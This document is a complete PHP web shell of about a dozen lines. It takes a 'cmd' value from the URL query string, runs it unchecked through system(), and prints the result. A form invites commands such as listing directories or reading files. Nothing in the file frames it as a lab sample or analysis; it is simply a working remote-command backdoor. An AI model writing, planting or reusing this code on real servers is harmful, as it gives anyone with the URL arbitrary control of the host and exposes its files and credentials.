<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    $cmd = $_GET['cmd'];
    system($cmd);
    echo "</pre>";
} else {
    echo '<form method="GET">
            <input type="text" name="cmd" placeholder="ls -la or cat file.php" style="width:300px;">
            <input type="submit" value="Run">
          </form>';
}
?>
